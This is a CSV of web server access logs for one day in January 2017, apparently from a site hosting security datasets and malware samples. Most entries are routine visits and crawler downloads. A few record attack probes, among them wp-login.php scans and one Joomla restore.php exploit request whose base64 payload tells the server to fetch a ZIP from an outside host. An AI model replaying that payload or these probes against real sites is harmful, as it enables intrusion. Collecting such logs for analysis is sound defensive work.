Log Format,Field 1,Field 2,Field 3,Field 4,Field 5,Field 6,Field 7
WSC,14.139.187.130,-,01/Jan/2017:02:16:51 -0800,GET / HTTP/1.1,200,10267
WSC,14.139.187.130,-,01/Jan/2017:02:16:55 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,14.139.187.130,-,01/Jan/2017:02:16:56 -0800,GET /twitter-icon.png HTTP/1.1,200,27788
WSC,68.180.228.229,-,01/Jan/2017:02:17:59 -0800,GET /robots.txt HTTP/1.1,200,233
WSC,68.180.228.229,-,01/Jan/2017:02:17:59 -0800,GET /self.logs/access.log.2015-11-01.gz HTTP/1.1,200,6465
WSC,207.46.13.146,-,01/Jan/2017:03:01:47 -0800,GET /self.logs/ HTTP/1.1,200,14674
WSC,68.180.228.229,-,01/Jan/2017:03:07:34 -0800,GET /maccdc2012/signatures.log.gz HTTP/1.1,200,549
WSC,123.125.67.226,-,01/Jan/2017:04:01:29 -0800,GET /robots.txt HTTP/1.1,200,297
WSC,85.115.32.180,-,01/Jan/2017:04:05:15 -0800,GET / HTTP/1.1,200,10211
WSC,144.32.170.29,-,01/Jan/2017:04:05:20 -0800,GET / HTTP/1.1,304,189
WSC,85.115.32.180,-,01/Jan/2017:04:05:20 -0800,GET /favicon.ico HTTP/1.1,200,212
WSC,144.32.170.29,-,01/Jan/2017:04:05:20 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,144.32.170.29,-,01/Jan/2017:04:05:20 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,144.32.170.29,-,01/Jan/2017:04:05:21 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,195.154.191.64,-,01/Jan/2017:04:08:07 -0800,GET /udd.php HTTP/1.0,404,295
WSC,195.154.191.64,-,01/Jan/2017:04:08:07 -0800,GET /udd.php HTTP/1.0,404,295
WSC,95.28.180.251,-,01/Jan/2017:04:17:12 -0800,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1,200,930799
WSC,166.88.123.66,-,01/Jan/2017:04:18:54 -0800,GET / HTTP/1.1,200,10230
WSC,166.88.123.66,-,01/Jan/2017:04:18:55 -0800,GET /twitter-icon.png HTTP/1.1,200,27751
WSC,166.88.123.66,-,01/Jan/2017:04:18:55 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7391
WSC,166.88.123.66,-,01/Jan/2017:04:18:56 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,553
WSC,220.181.108.117,-,01/Jan/2017:04:26:41 -0800,GET / HTTP/1.1,304,152
WSC,202.188.40.138,-,01/Jan/2017:04:36:42 -0800,GET / HTTP/1.1,200,10267
WSC,202.188.40.138,-,01/Jan/2017:04:36:44 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,202.188.40.138,-,01/Jan/2017:04:36:44 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,202.188.40.138,-,01/Jan/2017:04:36:45 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,202.188.40.138,-,01/Jan/2017:04:37:58 -0800,GET /squid/access.log.gz HTTP/1.1,200,28770
WSC,202.188.40.138,-,01/Jan/2017:04:38:07 -0800,GET /squid/access.log.gz HTTP/1.1,200,117342
WSC,211.144.0.163,-,01/Jan/2017:04:44:04 -0800,GET / HTTP/1.1,304,189
WSC,101.226.33.200,-,01/Jan/2017:04:44:25 -0800,GET / HTTP/1.1,200,10267
WSC,202.188.40.138,-,01/Jan/2017:04:37:58 -0800,GET /squid/access.log.gz HTTP/1.1,200,18016146
WSC,211.144.0.163,-,01/Jan/2017:04:45:14 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,119.147.146.60,-,01/Jan/2017:04:53:22 -0800,GET / HTTP/1.1,200,10211
WSC,82.81.92.138,-,01/Jan/2017:05:18:06 -0800,GET / HTTP/1.1,200,10267
WSC,82.81.92.138,-,01/Jan/2017:05:18:07 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,82.81.92.138,-,01/Jan/2017:05:18:07 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,82.81.92.138,-,01/Jan/2017:05:18:08 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,77.88.47.100,-,01/Jan/2017:05:23:55 -0800,GET /robots.txt HTTP/1.1,200,289
WSC,77.88.47.100,-,01/Jan/2017:05:23:59 -0800,GET / HTTP/1.1,200,10267
WSC,202.188.40.138,-,01/Jan/2017:05:24:15 -0800,GET /squid/access.log.gz HTTP/1.1,200,23177322
WSC,103.21.125.80,-,01/Jan/2017:05:37:55 -0800,GET / HTTP/1.1,200,10211
WSC,103.21.125.80,-,01/Jan/2017:05:37:57 -0800,GET /twitter-icon.png HTTP/1.1,200,27732
WSC,103.21.125.80,-,01/Jan/2017:05:37:57 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7372
WSC,103.21.125.80,-,01/Jan/2017:05:37:58 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,534
WSC,70.53.215.244,-,01/Jan/2017:05:43:39 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,70.53.215.244,-,01/Jan/2017:05:43:45 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,70.53.215.244,-,01/Jan/2017:05:43:52 -0800,GET / HTTP/1.1,200,34374
WSC,68.180.228.229,-,01/Jan/2017:05:52:15 -0800,GET /auth.log/auth.log.gz HTTP/1.1,200,554468
WSC,207.46.13.95,-,01/Jan/2017:05:59:46 -0800,GET / HTTP/1.1,301,483
WSC,207.46.13.95,-,01/Jan/2017:06:03:05 -0800,GET / HTTP/1.1,200,10267
WSC,162.217.31.85,-,01/Jan/2017:06:32:32 -0800,GET / HTTP/1.1,200,10230
WSC,162.217.31.85,-,01/Jan/2017:06:32:32 -0800,GET /apple-touch-icon-precomposed.png HTTP/1.1,404,303
WSC,162.217.31.85,-,01/Jan/2017:06:32:33 -0800,GET /apple-touch-icon.png HTTP/1.1,404,303
WSC,162.217.31.85,-,01/Jan/2017:06:32:34 -0800,GET /apple-touch-icon-precomposed.png HTTP/1.1,404,303
WSC,162.217.31.85,-,01/Jan/2017:06:32:34 -0800,GET /apple-touch-icon.png HTTP/1.1,404,303
WSC,94.252.88.177,-,01/Jan/2017:06:45:47 -0800,GET / HTTP/1.1,200,10267
WSC,94.252.88.177,-,01/Jan/2017:06:45:47 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,94.252.88.177,-,01/Jan/2017:06:45:47 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,94.252.88.177,-,01/Jan/2017:06:46:23 -0800,GET /pe_static/zeus.zip HTTP/1.1,200,51367111
WSC,47.189.17.206,-,01/Jan/2017:06:56:16 -0800,GET / HTTP/1.1,301,483
WSC,47.189.17.206,-,01/Jan/2017:06:56:17 -0800,GET / HTTP/1.1,200,10267
WSC,47.189.17.206,-,01/Jan/2017:06:56:17 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,47.189.17.206,-,01/Jan/2017:06:56:17 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,94.252.88.177,-,01/Jan/2017:07:09:11 -0800,GET / HTTP/1.1,200,10267
WSC,94.252.88.177,-,01/Jan/2017:07:09:12 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,94.252.88.177,-,01/Jan/2017:07:09:12 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,94.252.88.177,-,01/Jan/2017:07:09:23 -0800,GET /pe_static/ap1.zip HTTP/1.1,404,340
WSC,94.252.88.177,-,01/Jan/2017:07:09:42 -0800,GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1,200,4502388
WSC,71.10.36.99,-,01/Jan/2017:07:11:01 -0800,GET / HTTP/1.1,301,483
WSC,71.10.36.99,-,01/Jan/2017:07:11:01 -0800,GET / HTTP/1.1,200,10267
WSC,71.10.36.99,-,01/Jan/2017:07:11:01 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,71.10.36.99,-,01/Jan/2017:07:11:01 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,71.10.36.99,-,01/Jan/2017:07:11:02 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,66.249.66.105,-,01/Jan/2017:07:27:30 -0800,GET / HTTP/1.1,200,10267
WSC,172.56.42.13,-,01/Jan/2017:07:35:32 -0800,GET / HTTP/1.1,200,10267
WSC,172.56.42.13,-,01/Jan/2017:07:35:32 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,172.56.42.13,-,01/Jan/2017:07:35:32 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,172.56.42.13,-,01/Jan/2017:07:37:28 -0800,GET /honeypot/honeypot.json.zip HTTP/1.1,200,4631873
WSC,172.56.42.13,-,01/Jan/2017:07:37:48 -0800,GET /pe_static/zeus.zip HTTP/1.1,200,30515940
WSC,172.56.42.13,-,01/Jan/2017:07:50:13 -0800,GET /pe_static/ap1.zip HTTP/1.1,404,340
WSC,172.56.42.13,-,01/Jan/2017:07:50:18 -0800,GET /pe_static/ap1.zip HTTP/1.1,404,340
WSC,185.83.162.4,-,01/Jan/2017:07:54:27 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,185.83.162.4,-,01/Jan/2017:07:54:32 -0800,GET /wp-login.php HTTP/1.1,404,295
WSC,185.83.162.4,-,01/Jan/2017:07:54:38 -0800,GET / HTTP/1.1,200,34374
WSC,123.125.71.95,-,01/Jan/2017:07:58:10 -0800,GET /robots.txt HTTP/1.1,200,297
WSC,180.76.15.25,-,01/Jan/2017:08:25:20 -0800,GET / HTTP/1.1,200,21900
WSC,180.76.15.12,-,01/Jan/2017:08:25:47 -0800,GET / HTTP/1.1,200,21900
WSC,207.46.13.146,-,01/Jan/2017:08:31:25 -0800,GET /self.logs/access.log.2016-05-12.gz HTTP/1.1,200,14539
WSC,66.220.146.31,-,01/Jan/2017:08:37:59 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,220.181.108.182,-,01/Jan/2017:08:44:12 -0800,GET / HTTP/1.1,200,10230
WSC,61.251.236.11,-,01/Jan/2017:09:03:35 -0800,GET / HTTP/1.1,200,10267
WSC,61.251.236.11,-,01/Jan/2017:09:03:38 -0800,GET /twitter-icon.png HTTP/1.1,200,27788
WSC,61.251.236.11,-,01/Jan/2017:09:03:38 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,61.251.236.11,-,01/Jan/2017:09:03:44 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,98.220.75.1,-,01/Jan/2017:09:35:57 -0800,GET / HTTP/1.1,200,10267
WSC,98.220.75.1,-,01/Jan/2017:09:35:57 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7427
WSC,98.220.75.1,-,01/Jan/2017:09:35:57 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,24.146.203.160,-,01/Jan/2017:09:48:32 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,590
WSC,113.108.192.2,-,01/Jan/2017:09:59:51 -0800,GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1,200,2928460
WSC,180.151.172.46,-,01/Jan/2017:10:15:48 -0800,GET / HTTP/1.1,200,10267
WSC,180.151.172.46,-,01/Jan/2017:10:15:48 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,180.151.172.46,-,01/Jan/2017:10:15:49 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,180.151.172.46,-,01/Jan/2017:10:15:49 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,95.27.26.171,-,01/Jan/2017:10:19:23 -0800,GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1,200,930799
WSC,46.229.168.67,-,01/Jan/2017:10:35:13 -0800,GET / HTTP/1.1,301,446
WSC,157.55.39.75,-,01/Jan/2017:10:41:27 -0800,GET /maccdc2012/http.log.gz HTTP/1.1,200,10904102
WSC,46.229.168.65,-,01/Jan/2017:10:42:24 -0800,GET /self.logs/access.log.2016-11-05.gz HTTP/1.1,200,5919
WSC,46.229.168.68,-,01/Jan/2017:10:42:47 -0800,GET /self.logs/error.log.2016-11-14.gz HTTP/1.1,200,651
WSC,46.229.168.65,-,01/Jan/2017:10:43:09 -0800,GET /self.logs/access.log.2016-07-12.gz HTTP/1.1,200,21366
WSC,46.229.168.69,-,01/Jan/2017:10:43:40 -0800,GET /self.logs/error.log.2016-06-16.gz HTTP/1.1,200,1068
WSC,46.229.168.66,-,01/Jan/2017:10:43:49 -0800,GET /self.logs/error.log.2016-09-12.gz HTTP/1.1,200,900
WSC,46.229.168.71,-,01/Jan/2017:10:44:05 -0800,GET /self.logs/error.log.2016-09-25.gz HTTP/1.1,200,1413
WSC,46.229.168.74,-,01/Jan/2017:10:44:25 -0800,GET /self.logs/error.log.2016-06-22.gz HTTP/1.1,200,908
WSC,46.229.168.68,-,01/Jan/2017:10:44:43 -0800,GET /self.logs/error.log.2016-08-03.gz HTTP/1.1,200,1568
WSC,46.229.168.74,-,01/Jan/2017:10:45:06 -0800,GET /self.logs/access.log.2016-08-03.gz HTTP/1.1,200,12271
WSC,46.229.168.67,-,01/Jan/2017:10:45:42 -0800,GET /self.logs/access.log.2016-11-08.gz HTTP/1.1,200,8425
WSC,46.229.168.72,-,01/Jan/2017:10:45:44 -0800,GET /self.logs/access.log.2016-08-21.gz HTTP/1.1,200,7794
WSC,46.229.168.68,-,01/Jan/2017:10:46:03 -0800,GET /self.logs/error.log.2016-08-08.gz HTTP/1.1,200,892
WSC,46.229.168.70,-,01/Jan/2017:10:46:38 -0800,GET /self.logs/access.log.2016-09-25.gz HTTP/1.1,200,7095
WSC,46.229.168.69,-,01/Jan/2017:10:46:39 -0800,GET /self.logs/access.log.2016-09-14.gz HTTP/1.1,200,8588
WSC,46.229.168.70,-,01/Jan/2017:10:46:42 -0800,GET /self.logs/access.log.2016-09-25.gz HTTP/1.1,200,7095
WSC,46.229.168.66,-,01/Jan/2017:10:46:59 -0800,GET /self.logs/error.log.2016-07-22.gz HTTP/1.1,200,1309
WSC,46.229.168.65,-,01/Jan/2017:10:47:16 -0800,GET /self.logs/access.log.2016-08-13.gz HTTP/1.1,200,8471
WSC,46.229.168.68,-,01/Jan/2017:10:47:50 -0800,GET /self.logs/error.log.2016-11-01.gz HTTP/1.1,200,833
WSC,46.229.168.66,-,01/Jan/2017:10:47:54 -0800,GET /self.logs/access.log.2016-07-16.gz HTTP/1.1,200,8656
WSC,46.229.168.70,-,01/Jan/2017:10:48:39 -0800,GET /self.logs/access.log.2016-08-06.gz HTTP/1.1,200,18488
WSC,46.229.168.70,-,01/Jan/2017:10:48:39 -0800,GET /self.logs/access.log.2016-08-06.gz HTTP/1.1,200,18488
WSC,46.229.168.66,-,01/Jan/2017:10:48:46 -0800,GET /self.logs/error.log.2016-07-09.gz HTTP/1.1,200,1028
WSC,46.229.168.73,-,01/Jan/2017:10:49:02 -0800,GET /self.logs/error.log.2016-07-21.gz HTTP/1.1,200,741
WSC,46.229.168.74,-,01/Jan/2017:10:49:28 -0800,GET /self.logs/access.log.2016-09-12.gz HTTP/1.1,200,12313
WSC,46.229.168.73,-,01/Jan/2017:10:49:59 -0800,GET /self.logs/access.log.2016-11-04.gz HTTP/1.1,200,9334
WSC,46.229.168.68,-,01/Jan/2017:10:50:00 -0800,GET /self.logs/error.log.2016-10-09.gz HTTP/1.1,200,800
WSC,46.229.168.68,-,01/Jan/2017:10:50:09 -0800,GET /self.logs/error.log.2016-10-09.gz HTTP/1.1,200,800
WSC,46.229.168.65,-,01/Jan/2017:10:50:27 -0800,GET /self.logs/error.log.2016-08-25.gz HTTP/1.1,200,813
WSC,81.163.131.56,-,01/Jan/2017:10:50:30 -0800,GET /self.logs/administrator/components/com_joomlaupdate/restore.php?task=stepRestore&factory=Tzo5OiJBS0ZhY3RvcnkiOjE6e3M6MTg6IgBBS0ZhY3RvcnkAdmFybGlzdCI7YToyOntzOjI3OiJraWNrc3RhcnQuc2VjdXJpdHkucGFzc3dvcmQiO3M6MDoiIjtzOjI2OiJraWNrc3RhcnQuc2V0dXAuc291cmNlZmlsZSI7czo0NDoiaHR0cDovL2VjZWxsLm5pdHJrbC5hYy5pbi9pcGl6cG0vd3Q1Mjg5bi56aXAiO319 HTTP/1.1,404,239
WSC,46.229.168.68,-,01/Jan/2017:10:50:32 -0800,GET /self.logs/access.log.2016-07-02.gz HTTP/1.1,200,5624
WSC,46.229.168.71,-,01/Jan/2017:10:51:02 -0800,GET /self.logs/error.log.2016-07-23.gz HTTP/1.1,200,1325
WSC,46.229.168.71,-,01/Jan/2017:10:51:23 -0800,GET /self.logs/error.log.2016-11-09.gz HTTP/1.1,200,670
WSC,46.229.168.67,-,01/Jan/2017:10:51:56 -0800,GET /self.logs/error.log.2016-07-31.gz HTTP/1.1,200,1076
WSC,46.229.168.66,-,01/Jan/2017:10:52:00 -0800,GET /self.logs/error.log.2016-11-02.gz HTTP/1.1,200,835
WSC,46.229.168.71,-,01/Jan/2017:10:52:16 -0800,GET /self.logs/error.log.2016-08-07.gz HTTP/1.1,200,1817
WSC,46.229.168.72,-,01/Jan/2017:10:52:35 -0800,GET /self.logs/access.log.2016-06-29.gz HTTP/1.1,200,8637
WSC,46.229.168.71,-,01/Jan/2017:10:53:00 -0800,GET /self.logs/error.log.2016-08-29.gz HTTP/1.1,200,924
WSC,46.229.168.65,-,01/Jan/2017:10:53:15 -0800,GET /self.logs/access.log.2016-11-02.gz HTTP/1.1,200,9780
WSC,46.229.168.72,-,01/Jan/2017:10:53:55 -0800,GET /self.logs/access.log.2016-10-20.gz HTTP/1.1,200,8477
WSC,46.229.168.68,-,01/Jan/2017:10:53:58 -0800,GET /self.logs/error.log.2016-10-19.gz HTTP/1.1,200,520
WSC,46.229.168.68,-,01/Jan/2017:10:53:58 -0800,GET /self.logs/error.log.2016-10-19.gz HTTP/1.1,200,520
WSC,46.229.168.69,-,01/Jan/2017:10:54:17 -0800,GET /self.logs/error.log.2016-08-02.gz HTTP/1.1,200,1059
WSC,46.229.168.72,-,01/Jan/2017:10:54:34 -0800,GET /self.logs/access.log.2016-06-22.gz HTTP/1.1,200,13212
WSC,46.229.168.69,-,01/Jan/2017:10:55:00 -0800,GET /self.logs/access.log.2016-06-15.gz HTTP/1.1,200,10976
WSC,46.229.168.72,-,01/Jan/2017:10:55:09 -0800,GET /self.logs/access.log.2016-10-22.gz HTTP/1.1,200,6431
WSC,46.229.168.71,-,01/Jan/2017:10:55:31 -0800,GET /self.logs/error.log.2016-11-06.gz HTTP/1.1,200,1175
WSC,46.229.168.71,-,01/Jan/2017:10:55:51 -0800,GET /self.logs/error.log.2016-06-28.gz HTTP/1.1,200,1041
WSC,46.229.168.71,-,01/Jan/2017:10:56:09 -0800,GET /self.logs/error.log.2016-10-05.gz HTTP/1.1,200,547
WSC,46.229.168.74,-,01/Jan/2017:10:56:28 -0800,GET /self.logs/access.log.2016-10-25.gz HTTP/1.1,200,12863
WSC,46.229.168.69,-,01/Jan/2017:10:56:52 -0800,GET /self.logs/access.log.2016-09-11.gz HTTP/1.1,200,21811
WSC,46.229.168.70,-,01/Jan/2017:10:57:03 -0800,GET /self.logs/access.log.2016-06-24.gz HTTP/1.1,200,8801
WSC,46.229.168.68,-,01/Jan/2017:10:57:29 -0800,GET /self.logs/error.log.2016-07-08.gz HTTP/1.1,200,678
WSC,46.229.168.71,-,01/Jan/2017:10:57:42 -0800,GET /self.logs/error.log.2016-11-04.gz HTTP/1.1,200,924
WSC,46.229.168.66,-,01/Jan/2017:10:57:58 -0800,GET /self.logs/error.log.2016-09-19.gz HTTP/1.1,200,773
WSC,46.229.168.69,-,01/Jan/2017:10:58:21 -0800,GET /self.logs/error.log.2016-11-05.gz HTTP/1.1,200,776
WSC,46.229.168.67,-,01/Jan/2017:10:58:33 -0800,GET /self.logs/access.log.2016-10-05.gz HTTP/1.1,200,6296
WSC,46.229.168.70,-,01/Jan/2017:10:58:56 -0800,GET /self.logs/error.log.2016-11-12.gz HTTP/1.1,200,672
WSC,46.229.168.67,-,01/Jan/2017:10:59:19 -0800,GET /self.logs/error.log.2016-10-26.gz HTTP/1.1,200,819
WSC,46.229.168.68,-,01/Jan/2017:10:59:32 -0800,GET /self.logs/access.log.2016-08-31.gz HTTP/1.1,200,8508
WSC,46.229.168.74,-,01/Jan/2017:10:59:50 -0800,GET /self.logs/error.log.2016-08-16.gz HTTP/1.1,200,986
WSC,46.229.168.72,-,01/Jan/2017:11:00:06 -0800,GET /self.logs/error.log.2016-10-02.gz HTTP/1.1,200,1639
WSC,46.229.168.74,-,01/Jan/2017:11:00:26 -0800,GET /self.logs/error.log.2016-08-15.gz HTTP/1.1,200,647
WSC,46.229.168.65,-,01/Jan/2017:11:00:46 -0800,GET /self.logs/access.log.2016-10-30.gz HTTP/1.1,200,12610
WSC,46.229.168.68,-,01/Jan/2017:11:01:00 -0800,GET /self.logs/error.log.2016-06-29.gz HTTP/1.1,200,1141
WSC,46.229.168.73,-,01/Jan/2017:11:01:20 -0800,GET /self.logs/access.log.2016-06-20.gz HTTP/1.1,200,9938
WSC,46.229.168.68,-,01/Jan/2017:11:01:41 -0800,GET /self.logs/access.log.2016-09-20.gz HTTP/1.1,200,11130
WSC,46.229.168.73,-,01/Jan/2017:11:01:59 -0800,GET /self.logs/access.log.2016-07-07.gz HTTP/1.1,200,11226
WSC,46.229.168.67,-,01/Jan/2017:11:02:21 -0800,GET /self.logs/error.log.2016-10-14.gz HTTP/1.1,200,708
WSC,46.229.168.72,-,01/Jan/2017:11:02:37 -0800,GET /self.logs/access.log.2016-07-22.gz HTTP/1.1,200,8119
WSC,46.229.168.72,-,01/Jan/2017:11:02:53 -0800,GET /self.logs/error.log.2016-07-26.gz HTTP/1.1,200,853
WSC,46.229.168.74,-,01/Jan/2017:11:03:11 -0800,GET /self.logs/access.log.2016-07-15.gz HTTP/1.1,200,12181
WSC,46.229.168.73,-,01/Jan/2017:11:03:29 -0800,GET /self.logs/access.log.2016-07-11.gz HTTP/1.1,200,11488
WSC,46.229.168.74,-,01/Jan/2017:11:03:45 -0800,GET /self.logs/access.log.2016-07-21.gz HTTP/1.1,200,8374
WSC,46.229.168.67,-,01/Jan/2017:11:04:02 -0800,GET /self.logs/error.log.2016-10-15.gz HTTP/1.1,200,699
WSC,46.229.168.69,-,01/Jan/2017:11:04:25 -0800,GET /self.logs/access.log.2016-07-05.gz HTTP/1.1,200,21090
WSC,46.229.168.73,-,01/Jan/2017:11:04:38 -0800,GET /self.logs/error.log.2016-07-27.gz HTTP/1.1,200,937
WSC,46.229.168.70,-,01/Jan/2017:11:05:00 -0800,GET /self.logs/access.log.2016-10-28.gz HTTP/1.1,200,7296
WSC,46.229.168.67,-,01/Jan/2017:11:05:21 -0800,GET /self.logs/access.log.2016-07-29.gz HTTP/1.1,200,6770
WSC,46.229.168.70,-,01/Jan/2017:11:05:32 -0800,GET /self.logs/access.log.2016-11-07.gz HTTP/1.1,200,11419
WSC,46.229.168.67,-,01/Jan/2017:11:05:51 -0800,GET /self.logs/access.log.2016-06-30.gz HTTP/1.1,200,9198
WSC,68.180.228.229,-,01/Jan/2017:11:06:06 -0800,GET /maccdc2012/maccdc2012_fast_alert.7z HTTP/1.1,200,1141714
WSC,46.229.168.67,-,01/Jan/2017:11:06:12 -0800,GET /self.logs/access.log.2016-10-26.gz HTTP/1.1,200,11007
WSC,46.229.168.65,-,01/Jan/2017:11:06:26 -0800,GET /self.logs/access.log.2016-06-18.gz HTTP/1.1,200,7950
WSC,46.229.168.74,-,01/Jan/2017:11:06:51 -0800,GET /self.logs/access.log.2016-10-02.gz HTTP/1.1,200,9388
WSC,46.229.168.65,-,01/Jan/2017:11:07:05 -0800,GET /self.logs/access.log.2016-08-10.gz HTTP/1.1,200,5945
WSC,46.229.168.66,-,01/Jan/2017:11:07:24 -0800,GET /self.logs/access.log.2016-08-30.gz HTTP/1.1,200,9205
WSC,46.229.168.72,-,01/Jan/2017:11:07:44 -0800,GET /self.logs/access.log.2016-11-13.gz HTTP/1.1,200,12404
WSC,46.229.168.71,-,01/Jan/2017:11:07:58 -0800,GET /self.logs/access.log.2016-07-30.gz HTTP/1.1,200,5568
WSC,46.229.168.72,-,01/Jan/2017:11:08:16 -0800,GET /self.logs/error.log.2016-11-13.gz HTTP/1.1,200,880
WSC,46.229.168.67,-,01/Jan/2017:11:08:37 -0800,GET /self.logs/error.log.2016-07-29.gz HTTP/1.1,200,970
WSC,46.229.168.65,-,01/Jan/2017:11:08:52 -0800,GET /self.logs/access.log.2016-07-17.gz HTTP/1.1,200,6411
WSC,46.229.168.67,-,01/Jan/2017:11:09:10 -0800,GET /self.logs/error.log.2016-06-23.gz HTTP/1.1,200,789
WSC,46.229.168.73,-,01/Jan/2017:11:09:31 -0800,GET /self.logs/error.log.2016-06-24.gz HTTP/1.1,200,1325
WSC,46.229.168.69,-,01/Jan/2017:11:09:49 -0800,GET /self.logs/access.log.2016-08-22.gz HTTP/1.1,200,8830
WSC,46.229.168.74,-,01/Jan/2017:11:10:05 -0800,GET /self.logs/access.log.2016-08-02.gz HTTP/1.1,200,9918
WSC,46.229.168.68,-,01/Jan/2017:11:10:26 -0800,GET /self.logs/error.log.2016-09-04.gz HTTP/1.1,200,1029
WSC,46.229.168.73,-,01/Jan/2017:11:10:41 -0800,GET /self.logs/error.log.2016-10-12.gz HTTP/1.1,200,1276
WSC,36.110.120.151,-,01/Jan/2017:11:10:54 -0800,GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1,200,1279418
WSC,46.229.168.69,-,01/Jan/2017:11:11:00 -0800,GET /self.logs/error.log.2016-08-31.gz HTTP/1.1,200,796
WSC,46.229.168.70,-,01/Jan/2017:11:11:15 -0800,GET /self.logs/access.log.2016-09-10.gz HTTP/1.1,200,5328
WSC,46.229.168.67,-,01/Jan/2017:11:11:39 -0800,GET /self.logs/error.log.2016-07-20.gz HTTP/1.1,200,981
WSC,46.229.168.74,-,01/Jan/2017:11:11:53 -0800,GET /self.logs/error.log.2016-09-29.gz HTTP/1.1,200,550
WSC,46.229.168.65,-,01/Jan/2017:11:12:10 -0800,GET /self.logs/error.log.2016-10-20.gz HTTP/1.1,200,660
WSC,46.229.168.72,-,01/Jan/2017:11:12:28 -0800,GET /self.logs/access.log.2016-06-23.gz HTTP/1.1,200,7032
WSC,46.229.168.73,-,01/Jan/2017:11:12:49 -0800,GET /self.logs/access.log.2016-10-15.gz HTTP/1.1,200,6915
WSC,46.229.168.65,-,01/Jan/2017:11:13:06 -0800,GET /self.logs/error.log.2016-09-02.gz HTTP/1.1,200,735
WSC,46.229.168.68,-,01/Jan/2017:11:13:24 -0800,GET /self.logs/access.log.2016-04-19.gz HTTP/1.1,200,23663
WSC,46.229.168.65,-,01/Jan/2017:11:13:42 -0800,GET /self.logs/error.log.2016-05-28.gz HTTP/1.1,200,589
WSC,46.229.168.71,-,01/Jan/2017:11:14:02 -0800,GET /self.logs/access.log.2015-03-12.gz HTTP/1.1,200,9523
WSC,46.229.168.67,-,01/Jan/2017:11:14:16 -0800,GET /self.logs/error.log.2015-01-21.gz HTTP/1.1,200,579
WSC,46.229.168.72,-,01/Jan/2017:11:14:36 -0800,GET /self.logs/access.log.2015-06-12.gz HTTP/1.1,200,6190
WSC,46.229.168.68,-,01/Jan/2017:11:14:54 -0800,GET /self.logs/error.log.2016-02-12.gz HTTP/1.1,200,814
WSC,46.229.168.74,-,01/Jan/2017:11:15:09 -0800,GET /self.logs/error.log.2015-02-13.gz HTTP/1.1,200,5419
WSC,46.229.168.66,-,01/Jan/2017:11:15:32 -0800,GET /self.logs/access.log.2015-04-24.gz HTTP/1.1,200,3685
WSC,46.229.168.71,-,01/Jan/2017:11:15:53 -0800,GET /self.logs/error.log.2015-04-25.gz HTTP/1.1,200,956
WSC,46.229.168.71,-,01/Jan/2017:11:16:03 -0800,GET /self.logs/error.log.2016-05-26.gz HTTP/1.1,200,771
WSC,123.125.67.224,-,01/Jan/2017:11:16:15 -0800,GET / HTTP/1.1,200,10230
WSC,123.125.71.76,-,01/Jan/2017:11:16:16 -0800,GET / HTTP/1.1,200,10230
WSC,46.229.168.71,-,01/Jan/2017:11:16:25 -0800,GET /self.logs/error.log.2015-06-30.gz HTTP/1.1,200,756
WSC,46.229.168.74,-,01/Jan/2017:11:16:45 -0800,GET /self.logs/error.log.2015-04-11.gz HTTP/1.1,200,1758
WSC,46.229.168.67,-,01/Jan/2017:11:16:58 -0800,GET /self.logs/access.log.2015-11-12.gz HTTP/1.1,200,6074
WSC,46.229.168.73,-,01/Jan/2017:11:17:19 -0800,GET /self.logs/access.log.2016-04-15.gz HTTP/1.1,200,11780
WSC,46.229.168.68,-,01/Jan/2017:11:17:34 -0800,GET /self.logs/access.log.2016-01-09.gz HTTP/1.1,200,13008
WSC,46.229.168.70,-,01/Jan/2017:11:17:55 -0800,GET /self.logs/access.log.2016-05-09.gz HTTP/1.1,200,8385
WSC,46.229.168.66,-,01/Jan/2017:11:18:10 -0800,GET /self.logs/access.log.2015-11-30.gz HTTP/1.1,200,5189
WSC,46.229.168.66,-,01/Jan/2017:11:18:31 -0800,GET /self.logs/error.log.2015-06-18.gz HTTP/1.1,200,670
WSC,46.229.168.74,-,01/Jan/2017:11:18:49 -0800,GET /self.logs/error.log.2015-10-16.gz HTTP/1.1,200,774
